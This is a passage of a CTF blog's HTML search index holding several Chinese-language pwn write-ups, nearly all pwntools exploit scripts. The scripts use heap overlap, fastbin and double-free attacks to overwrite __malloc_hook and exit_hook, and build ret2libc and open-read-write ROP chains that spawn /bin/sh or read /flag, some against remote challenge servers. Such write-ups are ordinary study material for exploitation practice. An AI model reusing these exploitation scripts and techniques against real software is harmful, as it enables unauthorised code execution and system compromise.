print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
realloc=libc.sym[b&amp;quot;__libc_realloc&amp;quot;]+leak_addr
malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+leak_addr

add(0x60)
delete()

add(0x10)
update(cyclic(0x30)+b&amp;quot;\x40&amp;quot;)
edit(p64(malloc_hook-0x23))

add(0x60)
add(0x60)
edit(cyclic(0xb)+p64(shell)+p64(realloc+0x10))

# gdb.attach(io)
# pause()

add(0x10)
# add(0x10)
    
io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">nsctf_online_2019_pwn_1&2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/n_AKurXjc/"" data-c="
          &lt;p&gt;Á®ãÂ∫èËøêË°åÊµÅÁ®ãÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685368754887.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ë∞ÉÁî®&lt;code&gt;exit()&lt;/code&gt;ÂáΩÊï∞ÁöÑÊµÅÁ®ãÔºö&lt;br&gt;
&lt;code&gt;exit()-&amp;gt;_dl_fini()-&amp;gt;_rtld_global-&amp;gt;_rtld_global._rtld_lock_recursive-&amp;gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;&lt;br&gt;
ÂÖ∂‰∏≠&lt;code&gt;_rtld_global._rtld_lock_recursive-&lt;/code&gt;Âíå&lt;code&gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;Â∞±ÊòØÊâÄËØ¥ÁöÑ&lt;code&gt;exit_hook&lt;/code&gt;&lt;br&gt;
Ê≠§È¢òÂèØ‰ª•‰ªªÊÑèÂú∞ÂùÄÂÜô5Ê¨°ÔºåÊØèÊ¨°ÂÜô1Â≠óËäÇÔºåÂºÄÂ§¥Ê≥ÑÈú≤&lt;code&gt;sleep()&lt;/code&gt;ÂáΩÊï∞Âú∞ÂùÄÔºåÂèØ‰ª•ÊçÆÊ≠§ÁÆóÂá∫libcÂü∫ÂùÄÔºåËÄå&lt;code&gt;_rtld_global&lt;/code&gt;Âú®ld‰∏äÔºåÊâÄ‰ª•Ê†πÊçÆÂÅèÁßªÊ±ÇÂá∫ldÂü∫ÂùÄÔºåÈÄöËøáÂÅèÁßªÊ±ÇÂá∫&lt;code&gt;exit_hook&lt;/code&gt;Âú∞ÂùÄ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685369489489.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685369494078.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊúÄÂêéÂ∞Üone_gadgetÂÜôÂÖ•&lt;code&gt;exit_hook&lt;/code&gt;Âç≥ÂèØ&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29187)
# io=process(&amp;quot;./the_end&amp;quot;)
elf=ELF(&amp;quot;./the_end&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
ld=ELF(&amp;quot;./ld-2.27.so&amp;quot;)

def ss(c,cc):
    io.send(c)
    io.send(cc)

io.recvuntil(b&amp;quot;gift &amp;quot;)
leak_addr=int(io.recv(14),16)
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_base=leak_addr-libc.sym[b&amp;quot;sleep&amp;quot;]
print(&amp;quot;libc_base: &amp;quot;+hex(libc_base))
ld_base=libc_base+0x3f1000
io.recvuntil(b&amp;quot;;)\n&amp;quot;)

_rtld_global=ld_base+ld.sym[b&amp;quot;_rtld_global&amp;quot;]
__rtld_lock_unlock_recursive=_rtld_global+0xf08
print(&amp;quot;_rtld_global: &amp;quot;+hex(_rtld_global))
print(&amp;quot;__rtld_lock_unlock_recursive: &amp;quot;+hex(__rtld_lock_unlock_recursive))

# one_gadget=[0x4f365,0x4f3c2,0x10a45c]
one_gadget=[0x4f2c5,0x4f322,0x10a38c]
shell=one_gadget[1]+libc_base
print(&amp;quot;shell: &amp;quot;,hex(shell))

for i in range(5):
    ss(p64(__rtld_lock_unlock_recursive+i),p64(shell)[i:i+1])

io.sendline(b&amp;quot;exec 1&amp;gt;&amp;amp;0&amp;quot;)
io.sendline(b&amp;quot;cat flag&amp;quot;)

io.interactive()

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">hctf2018_the_end wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/wOZrtuJ_Q1/"" data-c="
          &lt;p&gt;&lt;s&gt;ÂÖ®Ê†à‚úåÂ§™Â§öËæ£&lt;/s&gt;&lt;br&gt;
ÊåâÁÖßÈôÑ‰ª∂ÁºñÂè∑Ôºö&lt;/p&gt;
&lt;h4 id=&#34;attachment-11makewishes&#34;&gt;attachment-11Ôºö(makewishes)&lt;/h4&gt;
&lt;p&gt;‰º™ÈöèÊú∫+canary‰øùÊä§ÁöÑret2text&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10001)
# io=process(&amp;quot;./makewishes&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)


# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;first wish\n&amp;quot;)
payload=cyclic(0xe)+p64(0)
io.send(payload)
cs.srand(0)

io.recvuntil(b&amp;quot;number!\n&amp;quot;)
io.sendline(str(cs.rand()%9+1))

io.recvuntil(b&amp;quot;second wish!\n&amp;quot;)
payload=b&amp;quot;%11$p&amp;quot;
io.sendline(payload)
canary=int(io.recv(18),16)
print(&amp;quot;canary:  &amp;quot;+hex(canary))

cs.srand(0)

io.recvuntil(b&amp;quot;number!\n&amp;quot;)
io.sendline(str(cs.rand()%9+1))

io.recvuntil(b&amp;quot;final wish!\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(0x4011d6)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-12login&#34;&gt;attachment-12Ôºö(Login)&lt;/h4&gt;
&lt;p&gt;Á≠æÂà∞È¢òÔºåret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10000)
# io=process(&amp;quot;./Login&amp;quot;)
elf=ELF(&amp;quot;./Login&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

pop_rdi_ret=0x4008c3

io.recvuntil(b&amp;quot;tip: &amp;quot;)
libc_base=int(io.recv(14),16)-0x3c48e0
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))

# gdb.attach(io)
# pause()

sys_addr=libc_base+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_base+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;username:\n&amp;quot;)
payload=cyclic(0x1c)+p32(0x15CC15CC)
io.send(payload)

io.recvuntil(b&amp;quot;password:\n&amp;quot;)
payload=cyclic(0x28)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008c0 : pop r14 ; pop r15 ; ret
# 0x00000000004008c2 : pop r15 ; ret
# 0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400680 : pop rbp ; ret
# 0x00000000004008c3 : pop rdi ; ret
# 0x00000000004008c1 : pop rsi ; pop r15 ; ret
# 0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400599 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-13usage_of_pen&#34;&gt;attachment-13Ôºö(usage_of_pen)&lt;/h4&gt;
&lt;p&gt;Ë¢´ËøôÈÅìÈ¢òÂâçÈù¢ÁöÑÊØîËæÉÂáΩÊï∞ÊÅ∂ÂøÉÈÅì‰∫ÜÔºåÂæó‰∏äÁΩëÊü•‰π¶Ê≥ïÁü•ËØÜÊãºÊãºÈü≥ÁÑ∂ÂêéÁî®0Ë°•ÈΩê&lt;br&gt;
Ââ©‰∏ãÁöÑÂ∞±ÊòØret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./usage_of_pen&amp;quot;)
io=remote(&amp;quot;59.110.164.72&amp;quot;,10002)
elf=ELF(&amp;quot;./usage_of_pen&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


leave_ret=0x400942
pop_rdi=0x400c53
func_addr=0x400b0f
read_t1=0x40092B
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;!\n&amp;quot;)
# payload=b&amp;quot;dunbi000&amp;quot;
# payload=payload.ljust(40,b&amp;quot;+&amp;quot;)
# payload+=b&amp;quot;nvfeng00&amp;quot;
# payload=payload.ljust(72,b&amp;quot;+&amp;quot;)
payload=b&amp;quot;dunbi000cuobi000yufeng00dunfeng0cunfeng0nvfeng00yuefeng0anfeng00jiebi000&amp;quot;
io.send(payload)

io.recvuntil(b&amp;quot;space\n&amp;quot;)
payload=cyclic(0x28)+p64(func_addr)
io.send(payload)

payload=cyclic(0x28)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(func_addr)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x28)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400942 : leave ; ret
# 0x0000000000400c4c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c4e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c50 : pop r14 ; pop r15 ; ret
# 0x0000000000400c52 : pop r15 ; ret
# 0x0000000000400c4b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c4f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400800 : pop rbp ; ret
# 0x0000000000400c53 : pop rdi ; ret
# 0x0000000000400c51 : pop rsi ; pop r15 ; ret
# 0x0000000000400c4d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006c1 : ret
# 0x0000000000400a16 : ret 0x1474
# 0x00000000004009b2 : ret 0x8b48

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-14-your_character&#34;&gt;attachment-14: (your_character)&lt;/h4&gt;
&lt;p&gt;editÊúâoff by oneÊâìÂ†ÜÂùóÈáçÂè†ÔºåÊéßÂà∂Â†ÜÂùóÊúÄÂêéÊâìone_gadget&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./your_character&amp;quot;)
elf=ELF(&amp;quot;./your_character&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

# io.recvuntil(b&amp;quot;Your choice :&amp;quot;)
# io.sendline(b&amp;quot;2&amp;quot;)
# io.sendlineafter(b&amp;quot;character: \n&amp;quot;,b&amp;quot;a&amp;quot;)
io.recvuntil(b&amp;quot;Your choice :&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Damage of skill : &amp;quot;,str(n))
    io.sendafter(b&amp;quot;introduction of skill:&amp;quot;,cc)
    
def extend(i,n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(i))
    io.sendlineafter(b&amp;quot;Damage of skill : &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    io.sendafter(b&amp;quot;introduction of skill : &amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;Index :&amp;quot;,str(n))

gdb.attach(io)
pause()

add(0x80,b&amp;quot;aaa&amp;quot;) #0
add(0x18,b&amp;quot;bbb&amp;quot;) #1
add(0x18,b&amp;quot;ccc&amp;quot;) #2
add(0x18,b&amp;quot;ddd&amp;quot;) #3

edit(1,b&amp;quot;a&amp;quot;*0x18+p64(0x61))
delete(2)

add(0x50,b&amp;quot;www&amp;quot;) #2
edit(2,b&amp;quot;A&amp;quot;*0x8)
show(2)

io.recvuntil(b&amp;quot;A&amp;quot;*0x8)
leak_addr=u64(io.recvline()[:-1].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))


delete(0)

heap_addr=leak_addr-0xf0
edit(2,p64(0)*3+p64(0x21)+p64(0)+p64(heap_addr))
show(2)

libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x58-0x3C4B20
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=libc_addr+one_gadget[0]

edit(2,b&#39;A&#39;*0xf0+p64(heap_addr+0x10))  


io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-32double&#34;&gt;attachment-32Ôºö(double)&lt;/h4&gt;
&lt;p&gt;aba double freeÊéßÂà∂Â†ÜÂùóÂà∞ÊåáÂÆö‰ΩçÁΩÆÁÑ∂ÂêéÊéßÂà∂ÊåáÂÆö‰ΩçÁΩÆÊï∞ÊçÆ&lt;br&gt;
Êú¨È¢òÊ≥®ÊÑèÂ∏ÉÊ†àÁªÜËäÇ&lt;br&gt;
&lt;s&gt;f12ÊòØ‰∏™Â•Ω‰π†ÊÉØÔºåÊúÄÂºÄÂßãÊ≤°ÊâæÂà∞/bin/shÂ≠ó‰∏≤&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10021)
# io=process(&amp;quot;./attachment-32&amp;quot;)
elf=ELF(&amp;quot;./attachment-32&amp;quot;)

shell=0x4008f7
pop_rdi_ret=0x400cb3

def add(n,s):
    io.recv()
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recv()
    io.sendline(str(n))
    io.recv()
    io.sendline(str(s))
    
def edit(n,s):
    io.recv()
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recv()
    io.sendline(str(n))
    io.recv()
    io.sendline(s)  
    
def delete(n):
    io.recv()
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recv()
    io.sendline(str(n))
    
def ex():
    io.recv()
    io.sendline(b&amp;quot;5&amp;quot;)
    
add(0,0x68)
add(1,0x68)
add(2,0x10)
delete(1)
delete(0)
delete(1)

add(3,0x68)
edit(3,p64(0x6021d8))

# gdb.attach(io)
# pause()   

add(4,0x68)
add(5,0x68)
add(6,0x68)
edit(6,p64(0x15CC15CC)+p64(0x400cd8)+p64(0)*6+p64(0xCC51CC51)) #/bin/sh
ex()


io.recvuntil(b&amp;quot;reward: &amp;quot;)
leak_addr=int(io.recv(14),16)
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
leak_addr=leak_addr+0xf0
low=(leak_addr)&amp;amp;0xff-0x8
print(&amp;quot;low: &amp;quot;+hex(low))
high=(leak_addr&amp;amp;0xffff)&amp;gt;&amp;gt;8
print(&amp;quot;high: &amp;quot;+hex(high))


payload=cyclic(0x20)+p8(low)+p8(high)
payload=payload.ljust(0xf0,b&amp;quot;a&amp;quot;)+p64(0x6021f8)+p64(0x4008f7) #system
io.recvuntil(b&amp;quot;say:\n&amp;quot;)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400cac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400cae : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400cb0 : pop r14 ; pop r15 ; ret
# 0x0000000000400cb2 : pop r15 ; ret
# 0x0000000000400cab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400caf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007f0 : pop rbp ; ret
# 0x0000000000400cb3 : pop rdi ; ret
# 0x0000000000400cb1 : pop rsi ; pop r15 ; ret
# 0x0000000000400cad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b1 : ret
# 0x0000000000400c40 : ret 0xfffc

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-36chef&#34;&gt;attachment-36Ôºö(chef)&lt;/h4&gt;
&lt;p&gt;editÂ≠òÂú®Ê∫¢Âá∫ÂÜôÔºåÂèØ‰ª•off by oneÊûÑÈÄ†Â†ÜÂùóÈáçÂè†&lt;br&gt;
ÁÑ∂ÂêéÂ∞±ÊòØÁÆÄÂçïÁöÑÂä´ÊåÅ&lt;code&gt;__malloc_hook&lt;/code&gt;Êâìone_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;, 10031)
# io=process(&amp;quot;./chef&amp;quot;)
elf=ELF(&amp;quot;./chef&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def menu():
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    
def show():
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)
    
def add(n,cc):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;price of food:&amp;quot;,str(n))
    io.sendafter(b&amp;quot;name of food:&amp;quot;,cc)
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index of food:&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;price of food :&amp;quot;,str(s))
    io.sendafter(b&amp;quot;name of food:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index of food:&amp;quot;,str(n))
    
menu()

# gdb.attach(io)
# pause()    

add(0x18,b&amp;quot;aaa&amp;quot;) #0
add(0x40,b&amp;quot;bbb&amp;quot;) #1
add(0x30,b&amp;quot;ccc&amp;quot;) #2
add(0x10,b&amp;quot;eee&amp;quot;) #3

show()
edit(0,0x19,p64(0)*3+p64(0x91))
delete(1)
add(0x40,b&amp;quot;b&amp;quot;*7)
show()

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=leak_addr+one_gadget[1]

add(0x60,b&amp;quot;qqq&amp;quot;) #4
add(0x60,b&amp;quot;www&amp;quot;) #5
add(0x60,b&amp;quot;eee&amp;quot;) #6

delete(4)

payload=cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(3,len(payload),payload)
add(0x60,p64(shell))
add(0x60,cyclic(0x13)+p64(shell))

delete(5)

io.sendlineafter(b&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;price of food:&amp;quot;,b&amp;quot;96&amp;quot;)
# io.sendlineafter(b&amp;quot;name of food:&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()
    

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-37-trapped&#34;&gt;attachment-37: (Trapped)&lt;/h4&gt;
&lt;p&gt;ÂºÄÂêØÊ≤ôÁõíÁ¶ÅÁî®&lt;code&gt;execve()&lt;/code&gt;ÔºåÈúÄË¶ÅÊûÑÈÄ†orw ropÈìæ&lt;br&gt;
ÂêåÊó∂‰πüÂºÄÂêØcanary‰øùÊä§ÔºåÂèØ‰ª•Âà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ê≥ÑÈú≤&lt;br&gt;
Ê≥®ÊÑèÈ¢ùÂ§ñÊûÑÈÄ†readÂú®bssÊÆµËØªÂÖ•&lt;code&gt;&#39;/flag&#39;&lt;/code&gt;Â≠ó‰∏≤ÁªôorwÂÅöÂèÇÊï∞Áî®&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#ÂÇªÈÄºÊú¨Âú∞ÂºÄË∞ÉËØïËæìÂÖ•ÂøÖÂá∫ÈîÖ
from pwn import*
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./Trapped&amp;quot;)
io=remote(&amp;quot;59.110.164.72&amp;quot;, 10066)
elf=ELF(&amp;quot;./Trapped&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

pop_rdi_ret=0x400a23
pop_rsi_r15=0x400a21

io.recvuntil(b&amp;quot;larger box\n&amp;quot;)
payload=b&amp;quot;aaaa%9$p&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;aaaa&amp;quot;)
canary=int(io.recv(18),16)
print(&amp;quot;canary:  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;larger box\n&amp;quot;)
payload=b&amp;quot;99&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x400777)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

pop_rdx_ret=0x01b92+leak_addr
pop_rsi_ret=0x202f8+leak_addr
pop3_ret=0x400a1e
bss_addr=0x601100
bss_len=0x1000
para=0x7
open_addr=libc.sym[b&amp;quot;open&amp;quot;]+leak_addr
write_addr=libc.sym[b&amp;quot;write&amp;quot;]+leak_addr
read_addr=libc.sym[b&amp;quot;read&amp;quot;]+leak_addr
mprotect=libc.sym[b&amp;quot;mprotect&amp;quot;]+leak_addr

# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss_addr)+p64(elf.sym[b&amp;quot;read&amp;quot;])+p64(0x400777)
io.send(payload)
payload=b&amp;quot;/flag&amp;quot;
# payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)
io.send(payload)


io.recvuntil(b&amp;quot;about\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)
#o
payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)
#r
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss_addr+0x160)+p64(pop_rdx_ret)+p64(0x50)+p64(read_addr)
#w
payload+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(bss_addr+0x160)+p64(pop_rdx_ret)+p64(0x50)+p64(write_addr)
io.send(payload)
io.recv()


io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400a1c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a1e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a20 : pop r14 ; pop r15 ; ret
# 0x0000000000400a22 : pop r15 ; ret
# 0x0000000000400a1b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400a1f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006f8 : pop rbp ; ret
# 0x0000000000400a23 : pop rdi ; ret
# 0x0000000000400a21 : pop rsi ; pop r15 ; ret
# 0x0000000000400a1d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040060e : ret
# 0x0000000000400682 : ret 0x2009
# 0x0000000000400960 : ret 0x2be
# 0x000000000040062b : jmp 0x400610
# 0x0000000000400775 : jmp 0x400700
# 0x00000000004008f5 : jmp 0x4008f8
# 0x000000000040099d : jmp 0x4009ad
# 0x0000000000400c0b : jmp qword ptr [rbp]
# 0x00000000004008a9 : jmp qword ptr [rsi - 0x39]
# 0x00000000004006f1 : jmp rax

# Unique gadgets found: 13
